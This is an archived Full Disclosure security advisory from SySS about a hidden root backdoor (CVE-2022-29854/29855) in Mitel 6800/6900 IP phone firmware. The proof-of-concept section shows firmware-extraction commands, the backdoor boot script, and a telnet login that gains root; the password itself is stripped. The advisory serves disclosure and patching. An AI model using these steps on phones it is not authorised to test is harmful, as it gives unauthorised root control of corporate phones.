<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="Hidden Functionality (Backdoor) (CWE-912) / CVE-2022-29854, CVE-2022-29855"/>
<meta name="Author" content="Moritz Abrell"/>
<title>Full Disclosure: Hidden Functionality (Backdoor) (CWE-912) / CVE-2022-29854, CVE-2022-29855</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="31"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#32">By Date</a>
<a href="15"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="31"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#32">By Thread</a>
<a href="15"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">Hidden Functionality (Backdoor) (CWE-912) / CVE-2022-29854, CVE-2022-29855</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: Moritz Abrell &lt;moritz.abrell () syss de&gt;<br>

<em>Date</em>: Fri, 10 Jun 2022 11:11:50 +0200<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Advisory ID:               SYSS-2022-021
Product:                   Mitel 6800/6900 Series SIP Phones excluding 6970
                           Mitel 6900 Series IP (MiNet) Phones
Manufacturer:              Mitel Networks Corporation
Affected Version(s):       Rel 5.1 SP8 (5.1.0.8016) and earlier
                           Rel 6.0 (6.0.0.368) to 6.1 HF4 (6.1.0.165)
                           MiNet 1.8.0.12 and earlier
Tested Version(s):         6.1.0.146
Vulnerability Type:        Hidden Functionality (Backdoor) (CWE-912)
Risk Level:                High
Solution Status:           Fixed
Manufacturer Notification: 2022-02-23
Solution Date:             2022-05-03
Public Disclosure:         2022-06-10
CVE Reference:             CVE-2022-29854
                           CVE-2022-29855
Author of Advisory:        Moritz Abrell, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

Mitel Networks Corporation manufactures different IP- and SIP-based
desk phones.

The manufacturer describes these products, e.g., as follows:

&quot;The 6900 IP Series is a powerful suite of desk phones with crystal clear
audio, advanced features and a broad array of accessories to improve
productivity and mobility in today&apos;s modern business environment.&quot;

The firmware of several phones contains an undocumented backdoor which
allows an attacker to gain root access by pressing specific keys on
system boot.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The shell script &quot;check_mft.sh&quot;, which is located in the directory
&quot;/etc&quot; on the phone, checks whether the keys &quot;*&quot; and &quot;#&quot; are pressed
simultaneously during system startup.

The phone then sets its IP address to &quot;10.30.102.102&quot; and starts a
Telnet server. A Telnet login can then be performed with a static root
password.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

1. Identify the backdoor

1.1. Extract the jffs2 file system from an affected Mitel firmware:

#&gt; binwalk -e 6867i.st

DECIMAL       HEXADECIMAL     DESCRIPTION
- --------------------------------------------------------------------------------
347           0x15B           Linux kernel ARM boot executable zImage (little-endian)
15695         0x3D4F          gzip compressed data, maximum compression, from Unix, last modified: 2021-10-22 10:47:08
1223395       0x12AAE3        JFFS2 filesystem, little endian


1.2. Mount the jffs2 file system:

#&gt; modprobe jffs2
#&gt; modprobe mtdram total_size=70000
#&gt; modprobe mtdblock
#&gt; dd if=12AAE3.jffs2 of=/dev/mtdblock0
#&gt; mount -t jffs2 /dev/mtdblock0 /mnt/


1.3. The script &quot;check_mft.sh&quot; located in the &quot;/etc&quot; directory contains
the backdoor logic:

#&gt; cat /mnt/etc/check_mft.sh
************* content shortened ****************
#!/bin/sh

case &quot;$HOSTNAME&quot; in

#press and hold *  # two keys at the same time
</pre><tt>    
</tt><tt>     &quot;bcm911109_6867i&quot; | &quot;6867i&quot; | &quot;bcm911107_praxis_3&quot; |  &quot;bcm911109_aquarius_3&quot;)
</tt><pre style="margin: 0em;">
        GPIODetect=`gpio get 4`
        checkDhsgShorted
        #KEY_OUT0 (GPIO52)  -&gt; KEY_IN7 (GPIO50)  &quot;DownKey&quot; is press
        isCCATest=`dbg rw 0x8000d000 8| grep &quot;0x8000d000: 01ff 017f 01ff 01ff 01ff 01ff 01ff 01ff&quot;`
</pre><tt>        
</tt><tt>        keyBoardScanMatch=&quot;True&quot;
</tt><pre style="margin: 0em;">
        keycombinationMatch=`dbg rw 0x8000d000 8| grep &quot;0x8000d000: 01ff 01ff 01ff 01ff 01af 01ff 01ff 01ff&quot;`
    ;;
esac

echo &quot;keyBoardScanMatch = $keyBoardScanMatch,  dhsgShorted=$dhsgShorted &quot;
echo &quot;GPIODetect = $GPIODetect,keycombinationMatch=$keycombinationMatch&quot;
echo &quot;isCCATest = $isCCATest&quot;

if [ &quot;$keyBoardScanMatch&quot; -a $dhsgShorted -eq 1 -a $GPIODetect -eq &quot;0&quot; -o  &quot;$keycombinationMatch&quot; ]; then
    mount -t jffs2 /dev/mtdblock3 /nvdata
    if [ -f $ENETCFG ]; then
        . $ENETCFG
        MAC=${ENETCFG_MAC}
    fi

    /etc/if_bcm_net_setup.sh up
    ifconfig eth0 hw ether $MAC
    ifconfig eth0 10.30.102.102 netmask 255.255.255.0 up
</pre><tt>    
</tt><tt>    if [ -f /usr/sbin/telnetd ]; then
</tt><pre style="margin: 0em;">
         telnetd &amp;
    fi
    exit 255
fi
************* content shortened ****************


1.4. The file &quot;ota_BCM911109_PRAXIS_3_voice_v6_5_jffs2.bin&quot; located in
the directory &quot;/etc&quot; contains another jffs2 file system.


1.5. Extract and mount the file system as described in Steps 1
and 2.


1.6. The &quot;check_mft.sh&quot; in this file system also contains the root
password which is set by default and forced by the script:

#&gt; cat /mnt/etc/check_mft.sh
************* content shortened ****************
if [ -f /usr/sbin/telnetd ]; then
# make sure the default password is set for root.
    (echo (password stripped out); sleep 1; echo (password stripped out) | passwd -a A
    telnetd &amp;
fi
************* content shortened ****************


2. Exploiting

2.1. Boot the phone and press the &quot;*&quot; and &quot;#&quot; keys simultaneously.


2.2. Assign an IP address to communicate with the phone:

#&gt; ip addr add 10.30.102.100/24 dev eth0


2.3. Now, logging in to the phone as the root user with the static password
via Telnet is possible:

#&gt; telnet 10.30.102.102
Trying 10.30.102.102...
Connected to 10.30.102.102.
Escape character is &apos;^]&apos;.

(none) login: root
Password:
10.30.102.102 # id
uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Upgrade to one of the following (or later) versions:
- - 5.1 SP8 HF1 (5.1.0.8017)
- - 6.1 HF5 (6.1.0.171)
- - 6.2 SP1 (6.2.0.1012)
- - MiNet 1.8.0.15

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2022-02-22: Vulnerability discovered
2022-02-23: Vulnerability reported to manufacturer
2022-02-24: Acknowledgement of receipt of the vulnerability report
            received from the manufacturer
2022-03-30: Consultation with the manufacturer regarding updates to fix
            the vulnerability
2022-03-30: Manufacturer confirms the vulnerability, informs about the
            status to fix the vulnerability and asks for an extension of
            the disclosure timeline
2022-03-31: New disclosure date set to 2022-05-10
2022-05-04: Asking the manufacturer for any updates regarding the
            vulnerability
2022-05-05: Manufacturer provides a patch to fix this vulnerability
2022-05-05: Manufacturer publishes the vulnerability and assigned CVE IDs
2022-05-05: Manufacturer asks for another extension of the disclosure
            timeline, as large parts of the phones may still be unpatched
            in practice
2022-05-05: New disclosure date set to 2022-06-10
2022-06-10: Public disclosure of the vulnerability

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] Product website for Mitel IP desk phones:
    <a  rel="nofollow" href="https://www.mitel.com/products/devices-accessories/ip-phones-peripherals">https://www.mitel.com/products/devices-accessories/ip-phones-peripherals</a>
[2] SySS Responsible Disclosure Policy:
    <a  rel="nofollow" href="https://www.syss.de/en/responsible-disclosure-policy">https://www.syss.de/en/responsible-disclosure-policy</a>
[3] Vulnerability reports by the manufacturer:
    <a  rel="nofollow" href="https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-22-0004">https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-22-0004</a>
    <a  rel="nofollow" href="https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-22-0003">https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-22-0003</a>
[4] CVE-2022-29854:
    <a  rel="nofollow" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29854">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29854</a>
[5] CVE-2022-29855:
    <a  rel="nofollow" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29855">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29855</a>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Moritz Abrell of SySS GmbH.

E-Mail:moritz.abrell () syss de
Public Key:<a  rel="nofollow" href="https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Abrell.asc">https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Abrell.asc</a>
Key Fingerprint: 2927 7EB6 1A20 0679 79E9  87E6 AE0C 9BF8 F134 8B53

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided &quot;as is&quot;
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEKSd+thogBnl56Yfmrgyb+PE0i1MFAmKaIVcACgkQrgyb+PE0
i1O5fA/9H7onaudE9cqHwqBf0cjdXczlo2e52XXIvcX7NdxQ7HAPuo3kXAeHQCg4
0IlP2MB8rTBLtEJf43ZJhqDuK2J+Q6ypsVrmAzvCBYswsJjFH2SKYkS9cIx3CSaw
35G+J578oYQMex0fZJGK3vYGBPtTIoXhW3Gb4rdG41o6lhKQ3ELF04/9CQTUpKao
llCYe3zOhmacnpJ93w5aCenEPqJnrOy0w1bguQN6j43cEnGyv7hVIwW4ukQ4yTvz
iBjoRBx89VdjEQKb7g52D6pnORT48vgkDNXZcowofKtD1LZxPz6fC+cuBabSJz41
MFObTqfW9tYTVsBAuqIlQWavp3sy1Jenh/wb9gHILVXupv5flux2ffuKZPyDg6dq
dh66GXJaXEX0cWuUax8z6nj6l0nWOcjmbo07Ad1rox8bSOffSvtNRxEgij8tjwPg
UpWD6sofHid9BhGWJpyziBRvADDYSakohHZA+GCNONopVwhJdE+RrfOWaD1HV7jn
V+RI1ZmB1MYSDHKK11sfYpIFn1qdvF3l0hM0YVjxcy2iNn/cR9ZnId0wtRK4mVhx
wx5XBltwHMBREPgNUnqAmsAuAOitt7+vHdVpWA0/0A1vjJnFfdDy2rSiNoDRysrE
jp76E0iYjNPWdtJE67Q449Vwk6RINH7C+sSMbAQq5WfY336TyNQ=
=jFCk
-----END PGP SIGNATURE-----
_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="https://seclists.org/fulldisclosure/">https://seclists.org/fulldisclosure/</a>

</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="31"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#32">By Date</a>
<a href="15"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="31"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#32">By Thread</a>
<a href="15"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>Hidden Functionality (Backdoor) (CWE-912) / CVE-2022-29854, CVE-2022-29855</strong> <em>Moritz Abrell (Jun 10)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

